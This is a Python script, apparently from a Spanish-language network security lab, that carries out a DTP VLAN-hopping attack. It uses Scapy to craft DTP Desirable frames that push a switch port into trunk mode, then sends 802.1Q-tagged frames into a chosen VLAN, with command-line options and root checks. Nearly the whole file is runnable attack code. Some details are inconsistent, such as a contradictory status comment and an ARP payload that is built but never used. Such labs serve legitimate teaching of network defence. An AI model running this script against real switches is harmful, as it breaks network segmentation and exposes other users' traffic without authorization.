#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║         ATAQUE DTP VLAN HOPPING                                 ║
║         Seguridad de Redes — Laboratorio #8                     ║
╚══════════════════════════════════════════════════════════════════╝

Descripción:
    Explota el protocolo DTP (Dynamic Trunking Protocol) enviando
    mensajes DTP Desirable para negociar un enlace trunk con el
    switch, convirtiendo un puerto de acceso en trunk y ganando
    acceso a todas las VLANs de la red.

    Una vez establecido el trunk:
    - El atacante puede enviar/recibir tráfico de cualquier VLAN
    - Puede hacer VLAN Hopping hacia VLANs restringidas
    - Puede capturar tráfico de toda la red

Requisitos:
    pip3 install scapy
    Ejecutar como root

Uso:
    # Negociar trunk con el switch
    sudo python3 dtp_vlan_hopping.py -i ens3

    # Con VLAN objetivo específica
    sudo python3 dtp_vlan_hopping.py -i ens3 --target-vlan 10
"""

import argparse
import os
import sys
import time
import struct
import random

try:
    from scapy.all import (
        Ether, Dot1Q, LLC, SNAP, sendp, sniff,
        conf, get_if_hwaddr
    )
except ImportError:
    print("[!] Instalar Scapy: pip3 install scapy")
    sys.exit(1)

# ── Constantes DTP ────────────────────────────────────────────────
DTP_MULTICAST = "01:00:0c:cc:cc:cc"
SNAP_OUI_CISCO = b'\x00\x00\x0c'
SNAP_PID_DTP   = 0x2004


def build_dtp_packet(src_mac):
    """
    Construye un paquete DTP Desirable.

    DTP TLVs:
    - TLV 0x0001: Domain (nombre del dominio trunking)
    - TLV 0x0002: Status (0x83 = Trunk/Desirable)
    - TLV 0x0003: DTP Type (0xa5 = 802.1Q)
    - TLV 0x0004: Neighbor (MAC del vecino)
    """

    def make_tlv(tipo, valor):
        largo = 4 + len(valor)
        return (
            tipo.to_bytes(2, 'big') +
            largo.to_bytes(2, 'big') +
            valor
        )

    mac_bytes = bytes.fromhex(src_mac.replace(':', ''))

    # TLV 1 - Domain
    tlv_domain = make_tlv(0x0001, b'\x00' * 33)

    # TLV 2 - Status: 0x83 = Access/Desirable (negocia trunk)
    tlv_status = make_tlv(0x0002, b'\x83')

    # TLV 3 - DTP Type: 0xa5 = 802.1Q
    tlv_type = make_tlv(0x0003, b'\xa5')

    # TLV 4 - Neighbor MAC
    tlv_neighbor = make_tlv(0x0004, mac_bytes)

    tlvs = tlv_domain + tlv_status + tlv_type + tlv_neighbor

    # DTP Header: version(1)
    dtp_payload = b'\x01' + tlvs

    # SNAP
    snap = SNAP_OUI_CISCO + SNAP_PID_DTP.to_bytes(2, 'big') + dtp_payload

    # LLC
    llc = b'\xaa\xaa\x03' + snap

    pkt = Ether(src=src_mac, dst=DTP_MULTICAST) / llc
    return pkt


def build_dot1q_frame(src_mac, dst_mac, vlan_id, payload=b'\x00' * 46):
    """
    Construye frame 802.1Q con VLAN tag específica.
    Una vez establecido el trunk, podemos enviar
    tráfico a cualquier VLAN usando este frame.
    """
    pkt = (
        Ether(src=src_mac, dst=dst_mac) /
        Dot1Q(vlan=vlan_id) /
        payload
    )
    return pkt


def negotiate_trunk(iface, src_mac, count, delay):
    """
    Fase 1: Negociar el trunk enviando DTP Desirable.
    """
    print(f"[*] Fase 1 — Negociando trunk con DTP Desirable...")
    enviados = 0

    for i in range(count):
        pkt = build_dtp_packet(src_mac)
        sendp(pkt, iface=iface, verbose=0)
        enviados += 1
        print(f"\r[*] DTP enviados: {enviados}/{count}", end='', flush=True)
        time.sleep(delay)

    print(f"\n[+] {enviados} mensajes DTP enviados")
    return enviados


def vlan_hop(iface, src_mac, target_vlan, dst_mac="ff:ff:ff:ff:ff:ff"):
    """
    Fase 2: VLAN Hopping — enviar tráfico a la VLAN objetivo.
    Una vez establecido el trunk, podemos acceder a cualquier VLAN.
    """
    print(f"\n[*] Fase 2 — VLAN Hopping hacia VLAN {target_vlan}...")

    # Payload de prueba (ARP Request a la VLAN objetivo)
    payload = (
        b'\xff\xff\xff\xff\xff\xff'  # ARP broadcast
        + bytes.fromhex(src_mac.replace(':', ''))
        + b'\x08\x06'               # ARP ethertype
        + b'\x00' * 28              # ARP payload
    )

    enviados = 0
    try:
        for i in range(10):
            pkt = build_dot1q_frame(src_mac, dst_mac, target_vlan)
            sendp(pkt, iface=iface, verbose=0)
            enviados += 1
            print(f"\r[*] Frames VLAN {target_vlan} enviados: {enviados}", end='', flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass

    print(f"\n[+] VLAN Hopping completado — {enviados} frames a VLAN {target_vlan}")


def run_attack(iface, count, delay, target_vlan, skip_hop):
    """Ejecuta el ataque DTP VLAN Hopping completo."""
    conf.verb = 0

    try:
        src_mac = get_if_hwaddr(iface)
    except Exception:
        src_mac = "aa:bb:cc:dd:ee:ff"

    print(f"""
╔══════════════════════════════════════════╗
║      DTP VLAN Hopping — Iniciando        ║
╠══════════════════════════════════════════╣
║  Interfaz    : {iface:<25} ║
║  MAC Atacante: {src_mac:<25} ║
║  VLAN Objetivo: {target_vlan:<24} ║
║  DTP msgs    : {count:<25} ║
╚══════════════════════════════════════════╝
[!] Ctrl+C para detener
""")

    try:
        # Fase 1: Negociar trunk
        negotiate_trunk(iface, src_mac, count, delay)

        if not skip_hop:
            print(f"\n[*] Esperando 5 segundos para que el trunk se establezca...")
            time.sleep(5)

            # Fase 2: VLAN Hopping
            vlan_hop(iface, src_mac, target_vlan)

    except KeyboardInterrupt:
        print("\n\n[*] Ataque detenido.")

    print("\n[+] Ataque DTP completado")
    print(f"[*] Verificar en el switch: show interfaces trunk")
    print(f"[*] Verificar en el switch: show dtp interface")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Ataque DTP VLAN Hopping — negocia trunk y salta VLANs"
    )
    parser.add_argument('-i', '--iface',       required=True, help='Interfaz de red')
    parser.add_argument('-c', '--count',       type=int, default=10,
                        help='Mensajes DTP a enviar (default: 10)')
    parser.add_argument('-d', '--delay',       type=float, default=1.0,
                        help='Delay entre mensajes DTP (default: 1.0)')
    parser.add_argument('--target-vlan',       type=int, default=10,
                        help='VLAN objetivo para hopping (default: 10)')
    parser.add_argument('--skip-hop',          action='store_true',
                        help='Solo negociar trunk, sin hacer VLAN hop')
    return parser.parse_args()


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Ejecutar como root")
        sys.exit(1)

    args = parse_args()
    run_attack(
        iface       = args.iface,
        count       = args.count,
        delay       = args.delay,
        target_vlan = args.target_vlan,
        skip_hop    = args.skip_hop
    )
